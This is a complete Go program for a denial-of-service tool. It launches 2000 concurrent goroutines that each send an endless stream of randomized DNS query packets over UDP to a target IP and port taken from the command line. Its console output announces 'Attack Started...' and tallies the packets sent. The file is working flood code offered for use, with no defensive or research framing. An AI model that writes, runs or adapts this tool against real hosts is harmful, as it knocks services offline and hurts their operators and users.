package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const totalGoroutines = 2000

func generateValidDomain() string {
	domains := []string{"google.com", "example.com", "microsoft.com", "amazon.com", "facebook.com"}
	return domains[rand.Intn(len(domains))]
}

func createDNSQuery() []byte {
	transactionID := []byte{byte(rand.Intn(256)), byte(rand.Intn(256))}
	flags := []byte{0x01, 0x00}
	questions := []byte{0x00, 0x01}
	rrs := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	parts := strings.Split(generateValidDomain(), ".")
	queryName := []byte{}
	for _, part := range parts {
		queryName = append(queryName, byte(len(part)))
		queryName = append(queryName, []byte(part)...)
	}
	queryName = append(queryName, 0x00)
	queryType := []byte{0x00, 0x01}
	queryClass := []byte{0x00, 0x01}

	packet := append(transactionID, flags...)
	packet = append(packet, questions...)
	packet = append(packet, rrs...)
	packet = append(packet, queryName...)
	packet = append(packet, queryType...)
	packet = append(packet, queryClass...)
	return packet
}

func dnsFlood(target, port string, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	conn, err := net.Dial("udp", target+":"+port)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		query := createDNSQuery()
		_, err := conn.Write(query)
		if err != nil {
			break
		}
		atomic.AddUint64(counter, 1)
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(50)+10))
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run udp.go <ip> <port>")
		os.Exit(1)
	}

	target := os.Args[1]
	port := os.Args[2]

	fmt.Printf("\x1b[38;5;45mTarget    : %s\n", target)
	fmt.Printf("\x1b[38;5;45mPort      : %s\n", port)
	fmt.Printf("\x1b[38;5;46mStatus    : Attack Started...\033[0m\n")

	var wg sync.WaitGroup
	var counter uint64

	for i := 0; i < totalGoroutines; i++ {
		wg.Add(1)
		go dnsFlood(target, port, &wg, &counter)
	}

	wg.Wait()
	fmt.Printf("\n\x1b[38;5;82mTotal DNS Packets Sent: %d\x1b[0m\n", counter)
}